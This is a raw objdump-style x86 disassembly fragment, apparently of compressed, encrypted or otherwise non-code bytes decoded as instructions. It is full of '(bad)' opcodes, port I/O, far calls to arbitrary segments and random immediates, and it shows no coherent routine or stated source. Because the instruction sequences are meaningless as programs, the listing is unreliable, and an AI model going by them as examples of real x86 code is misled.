  41bb94:	mov    WORD PTR [edi+0x4d26d8a5],gs
  41bb9a:	pop    eax
  41bb9b:	jl     0x41bbe9
  41bb9d:	jno    0x41bb4e
  41bb9f:	test   DWORD PTR [eax-0x5d6f7c64],ecx
  41bba5:	xchg   cl,dh
  41bba7:	fsubr  DWORD PTR [edi]
  41bba9:	aaa    
  41bbaa:	daa    
  41bbab:	int    0x76
  41bbad:	and    ch,BYTE PTR [eax-0x64]
  41bbb0:	aas    
  41bbb1:	cmp    eax,0xfee8e7e5
  41bbb6:	mov    esi,0x151ffa4a
  41bbbb:	add    edx,DWORD PTR [eax-0x35]
  41bbbe:	jns    0x41bbbe
  41bbc0:	sub    esi,edx
  41bbc2:	sti    
  41bbc3:	jnp    0x41bc03
  41bbc5:	es jl  0x41bc0f
  41bbc8:	mov    dh,0x37
  41bbca:	xchg   ebp,eax
  41bbcb:	es inc ebp
  41bbcd:	fldcw  WORD PTR [edx+eax*1]
  41bbd0:	mov    dh,0x3
  41bbd2:	(bad)  
  41bbd3:	mov    bh,BYTE PTR [ebp-0x21]
  41bbd6:	add    al,BYTE PTR [ebx]
  41bbd8:	fs ja  0x41bbda
  41bbdb:	push   ebp
  41bbdc:	mov    al,0x5f
  41bbde:	rcl    cl,0x46
  41bbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbe2:	(bad)  
  41bbe3:	pop    esi
  41bbe4:	dec    ebx
  41bbe5:	shl    DWORD PTR [ecx+eax*2+0x54714363],cl
  41bbec:	xlat   BYTE PTR ds:[ebx]
  41bbed:	dec    eax
  41bbee:	mov    ebx,0x66037093
  41bbf3:	xchg   edi,eax
  41bbf4:	mov    dh,0x1f
  41bbf6:	or     BYTE PTR [ebp-0x3d],0xaf
  41bbfa:	jbe    0x41bc69
  41bbfc:	pushf  
  41bbfd:	imul   esp,DWORD PTR [edx-0xd],0xffffff9c
  41bc01:	mov    cl,0x30
  41bc03:	mov    dh,BYTE PTR [edx+0x678aca45]
  41bc09:	ja     0x41bba4
  41bc0b:	icebp  
  41bc0c:	mov    esp,0xf6598b8b
  41bc11:	mov    esi,0x5acaf87a
  41bc16:	mov    ds:0xe98d3528,eax
  41bc1b:	popf   
  41bc1c:	cwde   
  41bc1d:	arpl   WORD PTR [edi],di
  41bc1f:	scas   al,BYTE PTR es:[edi]
  41bc20:	dec    edi
  41bc21:	(bad)  
  41bc22:	fadd   QWORD PTR [ecx+0x26a6350b]
  41bc28:	dec    esp
  41bc29:	inc    esi
  41bc2a:	jbe    0x41bc8a
  41bc2c:	jg     0x41bc36
  41bc2e:	repz aad 0x27
  41bc31:	inc    edx
  41bc32:	mov    ebx,0xe4135de4
  41bc37:	cmp    BYTE PTR [esi+0x64],0x5b
  41bc3b:	sub    ebx,edx
  41bc3d:	jno    0x41bc04
  41bc3f:	pop    esp
  41bc40:	call   0xbab60522
  41bc45:	(bad)  
  41bc46:	and    eax,DWORD PTR [ebp+0x55cc095e]
  41bc4c:	sub    BYTE PTR [ebp-0x58b79d4b],0xa7
  41bc53:	mov    ecx,0xaa8ea936
  41bc58:	and    DWORD PTR [ebp+0x13],esp
  41bc5b:	add    cl,BYTE PTR [edi+0x6c32efdc]
  41bc61:	outs   dx,DWORD PTR ds:[esi]
  41bc62:	mov    ebx,0x929afa8d
  41bc67:	ins    DWORD PTR es:[edi],dx
  41bc68:	neg    DWORD PTR [edi-0x3e504ff6]
  41bc6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc6f:	into   
  41bc70:	jns    0x41bc5d
  41bc72:	sbb    DWORD PTR [ebp+0x338f6d83],ecx
  41bc78:	ins    BYTE PTR es:[edi],dx
  41bc79:	adc    ah,BYTE PTR ds:0x9e87c918
  41bc7f:	cmp    DWORD PTR [eax-0x1f518c38],ecx
  41bc85:	stc    
  41bc86:	inc    edi
  41bc87:	shl    BYTE PTR [eax],0x7b
  41bc8a:	xchg   ebx,eax
  41bc8b:	outs   dx,DWORD PTR ds:[esi]
  41bc8c:	push   ecx
  41bc8d:	out    dx,eax
  41bc8e:	(bad)  
  41bc91:	push   0xd6e71896
  41bc96:	mov    ebx,0x2e
	...
  41bd13:	add    ch,ch
  41bd15:	jle    0x41bd09
  41bd17:	ret    
  41bd18:	repz iret 
  41bd1a:	std    
  41bd1b:	jle    0x41bcfc
  41bd1d:	loope  0x41bd61
  41bd1f:	mov    al,0x6
  41bd21:	push   0xffffffbf
  41bd23:	jmp    0x431841
  41bd28:	ins    BYTE PTR es:[edi],dx
  41bd29:	pop    es
  41bd2a:	add    BYTE PTR [eax],al
  41bd2c:	sub    al,0x5
  41bd2e:	add    esp,DWORD PTR [edx-0x77b4b5da]
  41bd34:	jae    0x41bd9a
  41bd36:	dec    ecx
  41bd37:	loop   0x41bce9
  41bd39:	jae    0x41bd08
  41bd3b:	mov    ss,WORD PTR [esi-0x287c1989]
  41bd41:	aas    
  41bd42:	nop
  41bd43:	mov    ah,0xf0
  41bd45:	div    DWORD PTR [edi-0xae1a985]
  41bd4b:	push   esp
  41bd4c:	out    0x40,al
  41bd4e:	outs   dx,DWORD PTR ds:[esi]
  41bd4f:	or     DWORD PTR [ebx+0x78be0ef7],0x66
  41bd56:	(bad)  
  41bd57:	je     0x41bd44
  41bd59:	imul   edi,DWORD PTR [edx-0x57],0xfffffff0
  41bd5d:	xchg   BYTE PTR [ebx],ah
  41bd5f:	mov    BYTE PTR [edx+0x3dc0d0b3],dl
  41bd65:	div    eax
  41bd67:	cs sbb eax,0x42b9dbd5
  41bd6d:	rol    cl,1
  41bd6f:	add    dl,dl
  41bd71:	xor    BYTE PTR [ebx+0x22],0x36
  41bd75:	or     edi,DWORD PTR [ecx+esi*2+0x31]
  41bd79:	fs sub al,0xfe
  41bd7c:	add    BYTE PTR ds:0xf048eeeb,0xb0
  41bd83:	xor    bl,BYTE PTR fs:[eax+0x4d3ad907]
  41bd8a:	cld    
  41bd8b:	call   0xdf536712
  41bd90:	stc    
  41bd91:	std    
  41bd92:	test   BYTE PTR [ecx+edi*8+0x1e8177ae],bh
  41bd99:	bound  edi,QWORD PTR [eax]
  41bd9b:	sbb    esi,DWORD PTR [ebp+0x210ad1cf]
  41bda1:	mov    ds:0x298d83c2,al
  41bda6:	jg     0x41bd8a
  41bda8:	out    dx,al
  41bda9:	jge    0x41bdb5
  41bdab:	pop    es
  41bdac:	pop    es
  41bdad:	hlt    
  41bdae:	or     eax,0xb24fbf6d
  41bdb3:	xchg   edx,eax
  41bdb4:	push   es
  41bdb5:	inc    esi
  41bdb6:	into   
  41bdb7:	cld    
  41bdb8:	mov    ebx,0x74d7b3ce
  41bdbd:	test   DWORD PTR [ebp-0x2b],eax
  41bdc0:	xchg   esi,eax
  41bdc1:	ja     0x41bdf0
  41bdc3:	punpckhdq mm5,QWORD PTR [ebx+0x62b10275]
  41bdca:	ja     0x41bda1
  41bdcc:	inc    eax
  41bdcd:	sbb    eax,0x18793d5f
  41bdd2:	inc    ebp
  41bdd3:	sub    eax,esp
  41bdd5:	es aad 0x36
  41bdd8:	push   esp
  41bdd9:	rol    BYTE PTR [edx],1
  41bddb:	daa    
  41bddc:	es jnp 0x41be4c
  41bddf:	sbb    DWORD PTR [ecx+0x5b],ebx
  41bde2:	in     eax,dx
  41bde3:	push   ebx
  41bde4:	and    DWORD PTR [edx+0x14c91b7a],ebp
  41bdea:	adc    al,0xe8
  41bdec:	sub    ch,BYTE PTR [ebx+ebp*4+0x2ba815dd]
  41bdf3:	stos   BYTE PTR es:[edi],al
  41bdf4:	fld    st(4)
  41bdf6:	out    0xaf,eax
  41bdf8:	ror    DWORD PTR [ebx-0x18],cl
  41bdfb:	out    0x9a,eax
  41bdfd:	clc    
  41bdfe:	shl    ecx,0xb9
  41be01:	lea    esi,[edi]
  41be03:	cs dec esi
  41be05:	nop
  41be06:	repnz mov al,0x28
  41be09:	out    0xf0,al
  41be0b:	or     dl,BYTE PTR [edx-0x1ef244f5]
  41be11:	push   ss
  41be12:	jb     0x41be7b
  41be14:	pop    esi
  41be15:	adc    bl,BYTE PTR [eax]
  41be17:	adc    al,bl
  41be19:	mov    al,0x79
  41be1b:	test   eax,0x643676bf
  41be20:	jg     0x41be37
  41be22:	mov    DWORD PTR [edx+esi*2-0x3a],esi
  41be26:	arpl   WORD PTR [edx-0x65],dx
  41be29:	xor    eax,0xb7fae481
  41be2e:	std    
  41be2f:	adc    BYTE PTR [ebx],bl
  41be31:	outs   dx,BYTE PTR ds:[esi]
  41be32:	push   eax
  41be33:	fst    DWORD PTR [edx]
  41be35:	aam    0x21
  41be37:	test   eax,0x87390ec
  41be3c:	inc    esi
  41be3d:	and    edx,DWORD PTR [edi]
  41be3f:	add    eax,DWORD PTR [edx]
  41be41:	adc    edi,DWORD PTR [edx+0x23bf8a61]
  41be47:	sub    ecx,DWORD PTR [edi]
  41be49:	add    ecx,edx
  41be4b:	push   edi
  41be4c:	cmp    DWORD PTR [esi-0x65],edi
  41be4f:	inc    ebp
  41be50:	ret    0x5b64
  41be53:	dec    eax
  41be54:	adc    eax,0x73a6034
  41be59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be5a:	xor    eax,0xcacdbba7
  41be5f:	xchg   ecx,eax
  41be60:	inc    ecx
  41be61:	stos   BYTE PTR es:[edi],al
  41be62:	das    
  41be63:	and    eax,0xda8189be
  41be68:	mov    ds:0xef8999b,al
  41be6d:	mov    ds:0xc3fc0bcf,al
  41be72:	inc    ebx
  41be73:	in     al,dx
  41be74:	adc    BYTE PTR [ebp+0x5cbd64fc],ch
  41be7a:	test   al,0x6a
  41be7c:	and    al,0x11
  41be7e:	cmp    dh,BYTE PTR [esi]
  41be80:	cwde   
  41be81:	push   0x8c59e38e
  41be86:	and    DWORD PTR [edi+0x44],eax
  41be89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be8a:	xchg   esp,eax
  41be8b:	push   ss
  41be8c:	mov    dh,0x70
  41be8e:	push   ss
  41be8f:	xor    BYTE PTR [ecx+eiz*4+0x37],dl
  41be93:	out    dx,al
  41be94:	push   0xbcf8b18e
  41be99:	pop    ds
  41be9a:	xchg   esp,eax
  41be9b:	push   edx
  41be9c:	push   ecx
  41be9d:	cld    
  41be9e:	jl     0x41beca
  41bea0:	fmul   QWORD PTR [esi]
  41bea2:	aaa    
  41bea3:	fs int3 
  41bea5:	add    DWORD PTR [esp+edx*4-0x5163d12b],ebx
  41beac:	popf   
  41bead:	add    esi,eax
  41beaf:	sbb    al,0xe1
  41beb1:	cmp    ecx,esp
  41beb3:	and    al,0x3d
  41beb5:	aas    
  41beb6:	or     BYTE PTR [ebx],0x30
  41beb9:	sub    dh,bl
  41bebb:	cmp    BYTE PTR [edx+edx*8-0x50],cl
  41bebf:	jmp    0x85f24ae5
  41bec4:	xacquire xchg DWORD PTR [edx],ebx
  41bec7:	sbb    eax,0x8bf0d10f
  41becc:	cli    
  41becd:	push   ecx
  41bece:	or     DWORD PTR [esi],0x57901a9
  41bed4:	jp     0x41bec6
  41bed6:	mov    al,0xd7
  41bed8:	cmp    ah,BYTE PTR [ebp-0x34]
  41bedb:	out    dx,eax
  41bedc:	sub    dh,al
  41bede:	(bad)  
  41bedf:	sbb    al,0xe5
  41bee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bee2:	push   ecx
  41bee3:	lea    ebp,[edi-0x7f]
  41bee6:	adc    eax,DWORD PTR [esp+esi*1-0x702e7931]
  41beed:	aam    0x39
  41beef:	aad    0xf7
  41bef1:	call   0x178f6d81
  41bef6:	shr    BYTE PTR [eax-0x2d3caba1],0x4c
  41befd:	hlt    
  41befe:	aad    0x65
  41bf00:	shl    ch,0xa0
  41bf03:	loope  0x41beaf
  41bf05:	mov    ebx,0xaef61787
  41bf0a:	pop    ss
  41bf0b:	and    al,ah
  41bf0d:	mov    esp,ds
  41bf0f:	call   0xefe:0x45fbc084
  41bf16:	inc    ebx
  41bf17:	mov    ds:0xb691d6ba,eax
  41bf1c:	mov    cl,0x15
  41bf1e:	fld    st(0)
  41bf20:	add    dh,BYTE PTR [edx]
  41bf22:	push   cs
  41bf23:	shl    BYTE PTR [esi],cl
  41bf25:	out    dx,eax
  41bf26:	ins    DWORD PTR es:[edi],dx
  41bf27:	and    esi,ebx
  41bf29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf2a:	pop    ebp
  41bf2b:	not    BYTE PTR [ebx]
  41bf2d:	in     eax,dx
  41bf2e:	jp     0x41bf93
  41bf30:	push   es
  41bf31:	aad    0xaa
  41bf33:	loop   0x41bee5
  41bf35:	mov    eax,0x70c58fce
  41bf3a:	dec    edx
  41bf3b:	cmp    eax,0xa3753dae
  41bf40:	xchg   ah,bl
  41bf42:	sbb    BYTE PTR [ecx*4-0xdd9c2d5],0x9d
  41bf4a:	rcl    esi,cl
  41bf4c:	sub    eax,0x8b0dfe50
  41bf51:	fisub  DWORD PTR [eax+0x6b]
  41bf54:	mov    dl,0x21
  41bf56:	ss dec esi
  41bf58:	mov    dh,0x54
  41bf5a:	ins    DWORD PTR es:[edi],dx
  41bf5b:	outs   dx,DWORD PTR ds:[esi]
  41bf5c:	inc    edx
  41bf5d:	push   ss
  41bf5e:	cwde   
  41bf5f:	sub    BYTE PTR [ebp+0x44c26a1d],bl
  41bf65:	xchg   edx,eax
  41bf66:	adc    dl,bh
  41bf68:	mov    WORD PTR [edi+0x4768c109],cs
  41bf6e:	push   edi
  41bf6f:	icebp  
  41bf70:	mov    esp,0x1429bc49
  41bf75:	push   esi
  41bf76:	push   eax
  41bf77:	dec    edx
  41bf78:	call   0xd9442e31
  41bf7d:	fs aas 
  41bf7f:	cmc    
  41bf80:	xchg   ebx,eax
  41bf81:	add    al,0x72
  41bf83:	or     al,0xc
  41bf85:	sub    al,BYTE PTR [edx+0x15]
  41bf88:	in     al,dx
  41bf89:	enter  0xec76,0x68
  41bf8d:	scas   al,BYTE PTR es:[edi]
  41bf8e:	jmp    0x41bf1f
  41bf90:	or     BYTE PTR [esi],0x25
  41bf93:	fidivr WORD PTR [edi]
  41bf95:	(bad)  
  41bf97:	inc    edx
  41bf98:	lods   eax,DWORD PTR ds:[esi]
  41bf99:	test   eax,0x938c2734
  41bf9e:	scas   eax,DWORD PTR es:[edi]
  41bf9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfa0:	dec    ebx
  41bfa1:	(bad)  
  41bfa2:	or     BYTE PTR ds:0x87ae8a71,dh
  41bfa8:	das    
  41bfa9:	pop    ebx
  41bfaa:	stos   DWORD PTR es:[edi],eax
  41bfab:	les    ebx,FWORD PTR [ecx+0x109ce17d]
  41bfb1:	inc    eax
  41bfb2:	loopne 0x41c02b
  41bfb4:	mov    ah,0x2d
  41bfb6:	pop    edx
  41bfb7:	xor    DWORD PTR [eax+0x6b],ebx
  41bfba:	add    BYTE PTR [ecx-0x2a],dl
  41bfbd:	dec    esi
  41bfbe:	or     eax,0x9fb8dda8
  41bfc3:	mov    al,ds:0x2b1e2926
  41bfc8:	and    BYTE PTR ds:0x4a90215a,ah
  41bfce:	leave  
  41bfcf:	or     bl,BYTE PTR [edx]
  41bfd1:	add    BYTE PTR [edi-0x5a9705a6],bl
  41bfd7:	or     al,0xe0
  41bfd9:	sub    dl,BYTE PTR [ecx]
  41bfdb:	xchg   esp,eax
  41bfdc:	mov    ebx,0x13deaa43
  41bfe1:	lahf   
  41bfe2:	mov    esi,0xed653762
  41bfe7:	add    ebp,DWORD PTR [eax+0x4ba13132]
  41bfed:	in     eax,dx
  41bfee:	fs pop ds
  41bff0:	sub    al,0x21
  41bff2:	sub    ch,BYTE PTR [esi+0x6]
  41bff5:	mov    bl,0x16
  41bff7:	inc    eax
  41bff8:	lds    esp,FWORD PTR [eax]
  41bffa:	dec    BYTE PTR [ebp-0x63e0dcbf]
  41c000:	stc    
  41c001:	fwait
  41c002:	adc    DWORD PTR [ebp-0x61],0xffffffa7
  41c006:	leave  
  41c007:	adc    DWORD PTR [ebp-0x5270fb8f],0xffffff8a
  41c00e:	dec    esi
  41c00f:	fwait
  41c010:	popf   
  41c011:	shr    DWORD PTR [ebp+0x3c],cl
  41c014:	jne    0x41bfa9
  41c016:	push   edi
  41c017:	mov    dl,0x96
  41c019:	push   ss
  41c01a:	fnstsw WORD PTR [edi+0x1e7586f5]
  41c020:	mov    BYTE PTR [eax+0x4c911bfc],dl
  41c026:	ins    DWORD PTR es:[edi],dx
  41c027:	hlt    
  41c028:	add    ch,BYTE PTR [edx+0x659ecb44]
  41c02e:	mov    ebx,0xdbd642e3
  41c033:	out    dx,al
  41c034:	outs   dx,DWORD PTR ds:[esi]
  41c035:	xchg   DWORD PTR [edi],edi
  41c037:	leave  
  41c038:	into   
  41c039:	mov    cl,0x5c
  41c03b:	rcr    DWORD PTR [eax-0x40d39995],0x6e
  41c042:	and    dh,dh
  41c044:	mov    edx,0x8ed8917c
  41c049:	mov    ebx,0x37babca2
  41c04e:	pop    ds
  41c04f:	stos   DWORD PTR es:[edi],eax
  41c050:	xchg   ecx,eax
  41c051:	bound  esp,QWORD PTR ds:0x38d05b80
  41c057:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c059:	call   0xac45:0xe489a6ad
  41c060:	dec    esp
  41c061:	xchg   esi,eax
  41c062:	lahf   
  41c063:	cs gs push cs
  41c066:	mov    ah,0xce
  41c068:	popa   
  41c069:	dec    ebx
  41c06a:	mov    ebp,0xc302b713
  41c06f:	ja     0x41c0bf
  41c071:	(bad)  es:[ecx+0x7b53cd5d]
  41c078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c079:	mov    ecx,DWORD PTR [edi+0x7b]
  41c07c:	aam    0x9d
  41c07e:	xor    dh,BYTE PTR [ecx]
  41c080:	dec    edi
  41c081:	iret   
  41c082:	sbb    eax,DWORD PTR [ebp+0x3d53b0be]
  41c088:	imul   esi,DWORD PTR [esi+esi*8],0x5a0381cc
  41c08f:	ds dec ebp
  41c091:	mov    eax,ds:0xe2cd5dbc
  41c096:	mov    WORD PTR [ebx+0x499ea901],gs
  41c09c:	bound  ecx,QWORD PTR [edx+0x4f]
  41c09f:	loope  0x41c031
  41c0a1:	int3   
  41c0a2:	jnp    0x41c05c
  41c0a4:	push   ecx
  41c0a5:	adc    al,0x17
  41c0a7:	(bad)  
  41c0a8:	outs   dx,BYTE PTR ds:[esi]
  41c0a9:	mov    edi,0x85762ab2
  41c0ae:	or     dl,BYTE PTR [ecx-0x35afd80c]
  41c0b4:	lahf   
  41c0b5:	test   dh,bl
  41c0b7:	mov    ecx,0x5163e30
  41c0bc:	jno    0x41c0af
  41c0be:	push   esp
  41c0bf:	xchg   edi,eax
  41c0c0:	pop    ebp
  41c0c1:	sti    
  41c0c2:	inc    ebp
  41c0c3:	retf   
  41c0c4:	jne    0x41c114
  41c0c6:	mov    ebp,0xb38ced01
  41c0cb:	out    dx,eax
  41c0cc:	push   eax
  41c0cd:	test   BYTE PTR [edx-0x1c53254a],cl
  41c0d3:	pop    ss
  41c0d4:	xlat   BYTE PTR ds:[ebx]
  41c0d5:	jns    0x41c07e
  41c0d7:	sbb    dl,dh
  41c0d9:	(bad)  
  41c0da:	and    al,0x14
  41c0dc:	xor    esp,DWORD PTR [eax]
  41c0de:	xchg   edi,eax
  41c0df:	call   0xe389:0xb327ac41
  41c0e6:	jmpw   0x4a06
  41c0ea:	test   ebp,edx
  41c0ec:	mov    ebx,0xe8b1f4b8
  41c0f1:	sbb    al,0xe4
  41c0f3:	xchg   edi,eax
  41c0f4:	fwait
  41c0f5:	sub    esi,DWORD PTR [ebx+0x72da7ded]
  41c0fb:	arpl   WORD PTR [edi-0x2b05a494],dx
  41c101:	cwde   
  41c102:	mov    eax,ds:0xac1d9301
  41c107:	jb     0x41c0e9
  41c109:	or     al,0x14
  41c10b:	cmp    edi,DWORD PTR [ebp-0x28f2de14]
  41c111:	adc    eax,0x77a7f3e
  41c116:	aas    
  41c117:	and    BYTE PTR [esi-0x392cdb40],ah
  41c11d:	repnz xlat BYTE PTR ds:[ebx]
  41c11f:	xchg   ecx,eax
  41c120:	pop    ecx
  41c121:	test   BYTE PTR [eax],cl
  41c123:	aam    0x45
  41c125:	mov    esp,0x7e0e4e73
  41c12a:	mov    bh,0xfb
  41c12c:	call   0xf4c53748
  41c131:	pop    ss
  41c132:	dec    ecx
  41c133:	xor    eax,0xc19e7c8d
  41c138:	jg     0x41c191
  41c13a:	or     eax,0x22b67269
  41c13f:	or     eax,0xc1f7468e
  41c144:	jge    0x41c12a
  41c146:	ds push ebx
  41c148:	fsubr  DWORD PTR [ecx+0x60d984f5]
  41c14e:	shr    cl,0x8d
  41c151:	sbb    edi,DWORD PTR [esi+eax*2-0x7e8e267]
  41c158:	push   ecx
  41c159:	in     al,0xea
  41c15b:	fcom   QWORD PTR [eax-0x1de5b3ad]
  41c161:	push   ecx
  41c162:	stos   DWORD PTR es:[edi],eax
  41c163:	cmp    BYTE PTR [ebx+edi*4-0x32],0x74
  41c168:	ss (bad) {k4}
  41c16e:	push   esp
  41c16f:	pop    ds
  41c170:	test   al,0x3f
  41c172:	nop
  41c173:	dec    ebx
  41c174:	xchg   BYTE PTR [edx+edx*4+0x72],al
  41c178:	add    al,0x2
  41c17a:	inc    ecx
  41c17b:	mov    WORD PTR [edi],cs
  41c17d:	icebp  
  41c17e:	call   0x4258:0xa78d4edf
  41c185:	fsub   DWORD PTR [edi+0x7a]
  41c188:	fwait
  41c189:	or     cl,ch
  41c18b:	push   cs
  41c18c:	adc    eax,0xd6dcee85
  41c191:	jno    0x41c182
  41c193:	cli    
  41c194:	push   ss
  41c195:	add    ch,BYTE PTR [ecx+0x12]
  41c198:	in     eax,0xbe
  41c19a:	xchg   esi,eax
  41c19b:	ss test eax,0x3b32ee89
  41c1a1:	aaa    
  41c1a2:	xchg   edi,eax
  41c1a3:	rcr    DWORD PTR [edi+0x1f47a4b8],1
  41c1a9:	push   eax
  41c1aa:	or     edi,DWORD PTR [edi+eax*8-0x3ed6045b]
  41c1b1:	cmp    DWORD PTR [edx],eax
  41c1b3:	(bad)  
  41c1b5:	sti    
  41c1b6:	mov    edx,ecx
  41c1b8:	stc    
  41c1b9:	push   ds
  41c1ba:	outs   dx,DWORD PTR ds:[esi]
  41c1bb:	inc    ebx
  41c1bc:	xchg   esp,eax
  41c1bd:	xchg   esi,eax
  41c1be:	push   0xa0b7acf2
  41c1c3:	mov    eax,ds:0xb5d7bff1
  41c1c8:	ror    BYTE PTR [edx-0x30],cl
  41c1cb:	addr16 out 0x3f,al
  41c1ce:	mov    ds:0x630be08c,eax
  41c1d3:	js     0x41c1c0
  41c1d5:	mov    dl,0xff
  41c1d7:	in     eax,0xe9
  41c1d9:	loope  0x41c240
  41c1db:	jo     0x41c1e5
  41c1dd:	xchg   ebx,eax
  41c1de:	test   eax,0x52d3e3d
  41c1e3:	out    dx,al
  41c1e4:	dec    ecx
  41c1e5:	add    ecx,DWORD PTR [esp+esi*8-0x167ec06c]
  41c1ec:	xchg   BYTE PTR [ebp+0x237133ca],dl
  41c1f2:	inc    esi
  41c1f3:	dec    ecx
  41c1f4:	pop    ds
  41c1f5:	mov    BYTE PTR [eax],dl
  41c1f7:	jg     0x41c1b4
  41c1f9:	ss inc edi
  41c1fb:	pop    ebx
  41c1fc:	ror    al,0x11
  41c1ff:	xor    al,0xc8
  41c201:	(bad)  
  41c202:	call   0x59c01dd8
  41c207:	rol    DWORD PTR [eax],cl
  41c209:	out    dx,al
  41c20a:	stc    
  41c20b:	fdiv   st(5),st
  41c20d:	int    0xbd
  41c20f:	pop    ecx
  41c210:	pop    ss
  41c211:	shl    BYTE PTR [esi],0x71
  41c214:	pushf  
  41c215:	sti    
  41c216:	xor    esi,DWORD PTR [ebp-0x32]
  41c219:	add    BYTE PTR [edi-0x21d0bf0b],al
  41c21f:	push   ss
  41c220:	mov    ds:0xd681fef2,al
  41c225:	call   0x3abe:0xc775e7f3
  41c22c:	xor    eax,0x7b257c7c
  41c231:	jmp    0x41c1eb
  41c233:	rcl    BYTE PTR [edx-0x10f9d6],0xc3
  41c23a:	xchg   edi,eax
  41c23b:	jo     0x41c235
  41c23d:	add    esi,DWORD PTR [edi-0x5e]
  41c240:	or     cl,0x9
  41c243:	push   esp
  41c244:	sub    bl,ah
  41c246:	call   0x5fb4c378
  41c24b:	and    bl,ch
  41c24d:	pop    eax
  41c24e:	sar    eax,1
  41c250:	or     BYTE PTR [esi+eiz*1-0x69bb7a9d],ch
  41c257:	jge    0x41c287
  41c259:	std    
  41c25a:	(bad)  
  41c25b:	outs   dx,BYTE PTR ds:[esi]
  41c25c:	mov    al,ds:0x3cd93c84
  41c261:	data16 jb 0x41c28a
  41c264:	inc    ebx
  41c265:	xchg   edi,eax
  41c266:	jge    0x41c29a
  41c268:	ins    BYTE PTR es:[edi],dx
  41c269:	mov    ds:0x66dec61e,al
  41c26e:	add    eax,0x3d29eac0
  41c273:	dec    ebp
  41c274:	data16 add al,0x7a
  41c277:	sahf   
  41c278:	push   0x2b
  41c27a:	sbb    al,0x1c
  41c27c:	push   0xe8146c17
  41c281:	pusha  
  41c282:	daa    
  41c283:	inc    edi
  41c284:	mov    edx,0x226fccc2
  41c289:	rol    BYTE PTR [edi+ecx*2+0x53a09ec9],1
  41c290:	mov    eax,es
  41c292:	test   al,0x32
  41c294:	ins    DWORD PTR es:[edi],dx
  41c295:	daa    
  41c296:	xor    ch,BYTE PTR [edx-0x5af272de]
  41c29c:	sub    dh,BYTE PTR [edi-0x42]
  41c29f:	adc    DWORD PTR gs:[eax+edi*8],ecx
  41c2a3:	test   BYTE PTR [ecx+0x15a08851],dl
  41c2a9:	ja     0x41c285
  41c2ab:	arpl   WORD PTR [edx-0x70],dx
  41c2ae:	(bad)  
  41c2af:	jmp    0x41c24b
  41c2b1:	push   0xffffffc1
  41c2b3:	jno    0x41c275
  41c2b5:	pop    esi
  41c2b6:	dec    esp
  41c2b7:	mov    al,ds:0x3e18ada8
  41c2bc:	inc    BYTE PTR [ebp-0x2d]
  41c2bf:	push   eax
  41c2c0:	xor    eax,0x82e5a281
  41c2c5:	in     eax,dx
  41c2c6:	sub    BYTE PTR [esi],dh
  41c2c8:	cmp    al,0x8a
  41c2ca:	jo     0x41c27c
  41c2cc:	jo     0x41c2c4
  41c2ce:	mov    ds:0x64db79b6,al
  41c2d3:	retf   0x3558
  41c2d6:	aas    
  41c2d7:	mov    ah,0xab
  41c2d9:	aas    
  41c2da:	out    dx,eax
  41c2db:	cwde   
  41c2dc:	dec    esp
  41c2dd:	imul   ecx
  41c2df:	push   ebp
  41c2e0:	ret    
  41c2e1:	jge    0x41c27e
  41c2e3:	cs js  0x41c2a7
  41c2e6:	mov    ebx,0x4f11b165
  41c2eb:	sub    DWORD PTR [edi+0x2a3550eb],0xffffffea
  41c2f2:	scas   al,BYTE PTR es:[edi]
  41c2f3:	add    ch,dl
  41c2f5:	(bad)  
  41c2f6:	out    dx,al
  41c2f7:	stc    
  41c2f8:	jmp    0xcc49:0xe6b796b9
  41c2ff:	push   ebx
  41c300:	fistp  DWORD PTR [edx+0x334bf6ca]
  41c306:	mov    dh,0x87
  41c308:	adc    ebx,ebx
  41c30a:	lock jmp 0xb51a:0x413a0e70
  41c312:	ja     0x41c2c3
  41c314:	shl    DWORD PTR [eax-0x7a9c3382],0xf9
  41c31b:	fild   QWORD PTR ds:0x23851ef2
  41c321:	call   0x4e03:0x7fd830a4
  41c328:	pop    ebx
  41c329:	adc    bl,BYTE PTR [ebp-0x27]
  41c32c:	pop    esp
  41c32d:	inc    ecx
  41c32e:	fwait
  41c32f:	and    DWORD PTR [edi+0x3890b7c9],edi
  41c335:	pop    ss
  41c336:	add    edi,eax
  41c338:	leave  
  41c339:	call   0xa5e:0x3f83d5c7
  41c340:	fdivr  st,st(3)
  41c342:	dec    eax
  41c343:	shl    cl,cl
  41c345:	cmp    ch,BYTE PTR ds:0x23ae8f8
  41c34b:	push   esi
  41c34c:	lea    edi,[edx]
  41c34e:	cmp    dl,BYTE PTR [ebx-0x40866946]
  41c354:	lock jg 0x41c366
  41c357:	jno    0x41c31e
  41c359:	cdq    
  41c35a:	int    0xa7
  41c35c:	in     eax,dx
  41c35d:	inc    edi
  41c35e:	fistp  DWORD PTR [eax+0x62ae96fc]
  41c364:	clc    
  41c365:	lods   eax,DWORD PTR ds:[esi]
  41c366:	icebp  
  41c367:	mov    ds:0x1860840e,eax
  41c36c:	dec    edi
  41c36d:	xlat   BYTE PTR ds:[ebx]
  41c36e:	jp     0x41c353
  41c370:	pop    ss
  41c371:	es sbb eax,0xc325174b
  41c377:	xchg   DWORD PTR [edi-0x40],esi
  41c37a:	push   esp
  41c37b:	imul   ecx,DWORD PTR [edx-0x64732f0f],0x40be6e19
  41c385:	mov    dl,BYTE PTR [edx]
  41c387:	inc    ebp
  41c388:	dec    ebp
  41c389:	enter  0x7492,0xfe
  41c38d:	adc    al,0x1
  41c38f:	outs   dx,DWORD PTR ds:[esi]
  41c390:	test   al,0x5b
  41c392:	rcr    BYTE PTR [ebp-0x34281e77],1
  41c398:	push   es
  41c399:	pop    esi
  41c39a:	and    eax,DWORD PTR [ebx-0x49]
  41c39d:	mov    ds:0xcdf5af24,al
  41c3a2:	sbb    eax,0x3c27ae6f
  41c3a7:	jmp    0x98294862
  41c3ac:	cmp    DWORD PTR [esi-0x39fdf2b2],esi
  41c3b2:	repz loop 0x41c356
  41c3b5:	(bad)  
  41c3b6:	icebp  
  41c3b7:	fs mov edi,0xc147fe9b
  41c3bd:	sbb    dh,BYTE PTR [ebp-0x34ec2b77]
